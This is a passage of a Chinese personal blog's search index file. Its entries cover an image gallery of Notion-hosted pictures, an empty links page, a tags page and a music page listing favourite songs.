  <img class="gallery-group-img no-lightbox" src='https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F26f31f31-2616-4247-851a-17f1b29f33b2%2F55da18c34cf24b1bafcf37d3fddcf4ab.jpg?table=block&id=f02a8834-d79e-419f-9579-4d996ed0293a&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">远方</div>
  <p>喜欢的图片</p>
  <a href='/images/tupian/'></a>
  </figcaption>
  </figure>
  

  <figure class="gallery-group">
  <img class="gallery-group-img no-lightbox" src='https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4803d1a3-6ecb-4e3d-bb2c-624a650841c9%2F4fb78b1c69554d5da2d9d4cd326cb399.jpg?table=block&id=c43a70e3-f397-4c2a-b178-8bed53d102d3&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2' alt="Group Image Gallery">
  <figcaption>
  <div class="gallery-group-name">爱情</div>
  <p>喜欢的图片</p>
  <a href='/images/tupian/'></a>
  </figcaption>
  </figure>
  
</div>


]]></content>
  </entry>
  <entry>
    <title>友情链接</title>
    <url>/link/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>音乐</title>
    <url>/music/index.html</url>
    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>恋恋风尘-程壁</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>长街万象-程响</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>之子于归-霍尊</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>时间停下-房东的猫</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>云烟成雨-房东的猫</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>一个故事-张杰</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-music"></i><p>斑马斑马-房东的猫</p>
</div>


]]></content>
  </entry>
  <entry>
    <title>标签</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>图库</title>
    <url>/images/tupian/index.html</url>
    <content><![CDATA[<div class="gallery">
    <div class="fj-gallery  data" data-rowHeight="220" data-limit="10">
    <span class="gallery-data">[{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff8b2ed6b-2cc0-4a65-8787-161dc55c4135%2Fb9f3d1013cae48c4964936b93122edcd.jpg?table=block&id=fc273fa3-be81-4aa2-97cf-32b54248c8f0&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e79506c-d409-4def-92b2-0186b03ee142%2Fc586cac74b474b5ea5458a046e8b14c0.jpg?table=block&id=60596e13-9bda-4f2e-9163-fd559732db4e&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fce96e855-d6e1-4f81-9515-4e2fd217c6f9%2F5c23d52f880511ebb6edd017c2d2eca2.jpg?table=block&id=44156f35-c8a9-498c-932d-acfec82fae40&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F4803d1a3-6ecb-4e3d-bb2c-624a650841c9%2F4fb78b1c69554d5da2d9d4cd326cb399.jpg?table=block&id=c43a70e3-f397-4c2a-b178-8bed53d102d3&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F638ee6e8-6554-4f9b-80b7-9e9c0636d58b%2F68b69f4ebfae47d4b6ea479d71ff4328.jpg?table=block&id=e8f018ad-07dc-4cc2-8f66-7a0e6a4abc41&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F3aa9fa6a-3baa-4beb-aacc-2af52a888c9c%2F61ac5e440dac4d97a6624e05044c4074.jpg?table=block&id=8fc6b60d-9507-4039-b7c0-64aec1ea34b8&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feb10ebbf-5bd7-4132-8a17-80b464d97765%2F96b26df8437c44e899f67d2fee4777ae.jpg?table=block&id=e1d2fe81-6fc0-4e15-a680-161ba2b57f03&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""},{"url":"https://cookie-crest-0c5.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F20c792ab-deb7-4469-89e3-bef0bb25e29b%2F6355071687f84cfcb2cb002f9073f5a4.jpg?table=block&id=53a47579-b2bf-4c06-b5b8-89ad3e338690&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&width=2000&userId=&cache=v2","alt":""}]</span>
    </div>
    <button class="gallery-load-more"><span>加载更多</span><i class="fa-solid fa-arrow-down"></i></button>
    </div>


]]></content>
  </entry>
</search>
